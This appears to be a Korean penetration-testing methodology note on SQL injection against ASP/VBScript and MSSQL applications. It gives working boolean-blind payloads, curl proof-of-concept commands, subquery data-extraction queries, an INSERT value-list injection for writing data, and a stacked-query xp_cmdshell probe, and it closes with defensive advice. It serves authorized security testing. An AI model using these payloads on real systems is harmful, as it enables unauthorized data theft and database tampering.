# SQL Injection

> 승격 대상: `tech-docs/web/frameworks/iis-asp-mssql/sql-injection.md`
> (ASP/VBScript + MSSQL 조합에서 실측한 케이스들. 다른 스택에 일반화 가능한 원리는 §1 에.)

## 1. 원리

문자열 결합으로 쿼리를 만들면 사용자 입력이 **SQL 문법의 일부**가 된다. 방어가 없다면
공격자가 제어할 수 있는 것은 세 층위로 나뉜다:

1. **조건 제어** — WHERE 절의 참/거짓을 바꿀 수 있다 → 응답 차이를 오라클로 쓴다(데이터 추출).
2. **값 제어** — INSERT/UPDATE 의 값 목록에 식을 넣을 수 있다 → 임의 값 **기록**(쓰기).
3. **문장 제어** — `;` 로 추가 문장을 붙일 수 있다 → 명령 실행까지(스택드 쿼리).

어디까지 가능한지는 **DB 드라이버의 다중 문장 허용 여부 + DB 계정 권한**이 결정한다. 그래서
"SQLi 가 있다"는 판정 뒤에는 항상 **상한을 실측**해야 한다 — 같은 주입 지점이라도 조건 제어만
되면 상한이 "데이터 유출"이고, 값 제어까지 되면 "데이터 무결성 훼손"으로 등급이 올라간다.

**오라클은 3종류가 있다.** 응답 코드 차이(200/500), 본문 차이(행 수/마커 문자열), 시간 차이.
한 가지 방법이 막혀도 다른 방법으로 검증하라 — 이 프로젝트에서는 UNION 기반과 시간 지연
기반이 모두 막혔지만 본문 차이 오라클이 살아 있었다.

## 2. 케이스 A — 본문 차이 기반 boolean-blind (CHARINDEX/전문검색 파라미터)

**상황**: 검색 파라미터가 쿼리 조건식에 그대로 결합되고, 원본 조건이
`CHARINDEX(<열>, '<입력>') > 0` 형태.

**핵심**: 원본 조건식을 **닫고 OR 로 새 조건을 붙인다.** 원본 조건을 남겨두면 참/거짓 판정이
원본과 OR 되어 흐려지므로, 반드시 괄호로 정확히 닫는다.

```
<입력>')>0 OR (1=1))--
<입력>')>0 OR (1=2))--
```

**판정**: 응답 본문의 행 마커 개수. `(1=1)` 이면 다수, `(1=2)` 면 **0** 이다.
★ **절대 행수를 하드코딩하지 말 것** — 대상 데이터가 변하면 행수가 변한다. 판정 기준은
"**참일 때와 거짓일 때가 구분되는가**"(거짓 = 0행) 로 표현한다.

```bash
# TRUE
curl -s -G --data-urlencode "q=zzq')>0 OR (1=1))--" "$BASE/search.asp" | grep -c "class='posttext'"
# FALSE
curl -s -G --data-urlencode "q=zzq')>0 OR (1=2))--" "$BASE/search.asp" | grep -c "class='posttext'"
```

**함정 1 — 따옴표 하나만 넣으면 500**: 원본이 문자열 결합이라 `'` 하나만 넣으면 문법이 깨진다.
페이로드에 원본 조건의 구조(`>0`)를 **유지**해야 하고, 열린 괄호를 개수만큼 닫아야 한다.
**함정 2 — 공백 인코딩**: GET 에서 URL 인코딩을 직접 만들면 공백이 잘려 실패한다.
`--data-urlencode` 같은 라이브러리 인코딩을 쓴다.

## 3. 케이스 B — 상태코드 차이 기반 boolean-blind (숫자형 id)

**상황**: `id=<정수>` 가 쿼리에 그대로 붙는다. 이 경우 따옴표가 필요 없다.

```
id=1 AND 1=1     → 200 (정상 렌더)
id=1 AND 1=2     → 500 (행 0개 → 후속 코드가 null 참조)
```

참/거짓이 **HTTP 상태코드**로 갈리는 가장 다루기 쉬운 형태다. 단 `AND` 를 붙일 때 원본에
공백이 필요하므로 인코딩에 주의(`--data-urlencode`).

★ **id 를 하드코딩하지 말 것**: 공개 데모/운영 중인 대상은 데이터가 리셋되거나 다른 사용자가
글을 지워 **존재하는 id 집합이 변한다.** PoC 에는 id 를 먼저 발견하는 단계를 넣는다:

```bash
TID=$(curl -s "$BASE/forum.asp?id=1" | grep -o "thread\.asp?id=[0-9]*" | head -1 | grep -o "[0-9]*$")
curl -s -G --data-urlencode "id=$TID AND 1=1" "$BASE/thread.asp" -o /dev/null -w '%{http_code}\n'  # 200
curl -s -G --data-urlencode "id=$TID AND 1=2" "$BASE/thread.asp" -o /dev/null -w '%{http_code}\n'  # 500
```

## 4. 케이스 C — 서브쿼리 오라클로 데이터 추출

조건 자리에 서브쿼리를 넣으면 **DB 임의 값**을 참/거짓으로 바꿔 읽을 수 있다.

```
id=1 AND (SELECT SYSTEM_USER)='<추측값>'
id=1 AND (SELECT DB_NAME())='<추측값>'
id=1 AND (SELECT COUNT(*) FROM <테이블>)>100
id=1 AND (SELECT LEN(<열>) FROM <테이블> WHERE <조건>)=13
```

**이분탐색 함정**: `COUNT(*)` 처럼 상한이 예상보다 큰 값을 이분탐색할 때 **초기 hi 를 낮게
잡으면 hi 자체가 답으로 돌아온다**(예: 실제 131 인데 hi=1000 으로 시작해 1000 이 나옴 →
"1000 이상"이 아니라 "hi 를 키워라"는 신호). 결과가 딱 떨어지는 상한값이면 즉시 재측정한다.

**타입 함정(MSSQL)**: `SERVERPROPERTY()` 등 `sql_variant` 를 반환하는 함수는 문자열과 직접
비교하면 타입 오류/빈 결과가 된다. `CAST(SERVERPROPERTY('X') AS varchar(64))='...'` 로 감싼다.

## 5. 케이스 D — INSERT 문의 값 목록에 서브쿼리 (쓰기 원시능력) ★

**상황**: 회원가입/등록 폼이 `INSERT INTO t (c1,c2,c3,c4,c5) VALUES ('<입력1>','<입력2>',...)`
형태로 조립되고 입력이 이스케이프되지 않는다. 이 프로젝트에서 **같은 앱의 게시판 쓰기 경로는
`Replace(x,"'","''")` 로 막혀 있었는데 회원가입만 빠져 있었다** — 즉 "앱 전체가 안전/위험"이
아니라 **파일 단위로 판단**해야 한다.

**핵심**: 값 목록의 **원소 개수와 순서를 정확히 맞추고** 나머지를 주석으로 잘라낸다.

```
# 컬럼 5개 (uname, upass, email, realname, avatar)
tfUName = x', 'p', 'e', 'r', (SELECT TOP 1 <열> FROM <테이블> WHERE <조건>))--
```
실행되는 문장:
```sql
INSERT INTO t (c1,c2,c3,c4,c5) VALUES ('x','p','e','r',(SELECT ...))-- ', '...')
```

**이게 왜 등급 상승인가**: 조건 제어(§2~4)는 읽기만 가능하지만, 값 목록에 식을 넣을 수 있다는
것은 **DB 에 값을 쓸 수 있다**는 뜻이다. 페이로드를 `(SELECT ...)` 로 두면 "서버가 계산한 값을
그 행에 저장"하게 만들 수 있고, **쓰기→읽기 왕복**으로 그 값을 다시 꺼내 무결성 훼손을 증명한다.

**검증 프로토콜(쓰기 전용, 순서 중요)**:
1. **기준선** — 정상 값으로 1건 등록해 **기능 자체가 동작함**을 먼저 확립한다.
2. **대조군** — 같은 이름을 페이로드 없이 등록해 **정상 행의 형태**를 기록한다
   (여기서는 `avatar` 가 빈 문자열이었다).
3. **주입** — 서브쿼리를 넣어 등록.
4. **판정은 응답 코드가 아니라 "행의 내용"으로** — 200/302 는 INSERT 성공을 증명하지 않는다.
   삽입 행의 각 열을 **다시 읽어** 지정값과 서브쿼리 결과가 들어갔는지 확인한다.
   ```
   (SELECT COUNT(*) FROM t WHERE c1='<주입이름>')>0                 → 그 행이 실존하는가
   (SELECT c5 FROM t WHERE c1='<주입이름>')=(SELECT TOP 1 <열> ...) → 값 목록 안에서 식이 평가됐는가 ★
   (SELECT c5 FROM t WHERE c1='<대조이름>')=''                      → 정상 행과 구분되는가
   ```
5. **상한 확인** — 스택드 쿼리가 되는지 별도로 본다(§6). 안 되면 한계는 "**행 1건 삽입**"이다.

**되돌릴 수 없음**: INSERT 만 가능하고 DELETE 권한이 없으면 테스트 데이터는 **영구 잔존**한다.
승인 요청/보고서에 이 사실을 반드시 명시한다. 또한 이 프로젝트의 대상은 **공개 데모라 주기적으로
DB 가 리셋**되어 삽입 행이 사라졌다 — "쓰기 PoC 의 증거는 서버에 영구히 남지 않는다"고 가정하고
실행 시점의 응답을 원시 증거로 저장해야 한다.

## 6. 케이스 E — 스택드 쿼리 가능 여부 실측

`;` 로 추가 문장이 붙는지는 **드라이버/API 설정**이 결정하므로 추측하지 말고 실측한다.
이 프로젝트는 다중 문장이 실행되지 않아 상한이 "단일 문장 내부 조작"으로 고정됐다.

```
id=1; WAITFOR DELAY '0:0:5'--     → 지연 있으면 스택드 가능
id=1'; EXEC xp_cmdshell 'whoami'-- → RCE 후보(권한이 있으면)
```
지연이 **없으면** 스택드 불가로 확정하고, 이후 RCE 시도는 "권한 문제"가 아니라 "문장 실행 자체가
불가"로 분류해 시간을 아낀다. RCE 상한을 판단할 때는 `IS_SRVROLEMEMBER`/`HAS_PERMS_BY_NAME`,
`xp_cmdshell`·OLE·CLR 활성화 여부를 **전부 읽기 전용으로** 먼저 확인한다(권한이 전부 FALSE 면
RCE 사슬은 닫힌 것으로 보고 보고서에 "불가(검증)"으로 근거를 남긴다).

## 7. 방어 관점 요약

- 쿼리에 값을 결합하지 말고 **파라미터 바인딩**을 쓴다(문자열 이스케이프는 값 목록/식 문맥에서
  특히 취약).
- 최소 권한 계정을 쓴다(이 프로젝트에선 DB 계정이 비 sysadmin 이라 RCE 가 막혔지만, 사용자 DB
  7개를 읽을 수 있어 **교차 앱 데이터 유출**은 가능했다 — 권한 등급을 실제로 채굴해 기록할 것).
- 앱 전체 일괄 판정 금지 — **파일/엔드포인트 단위로 이스케이프 적용 여부를 점검**한다.
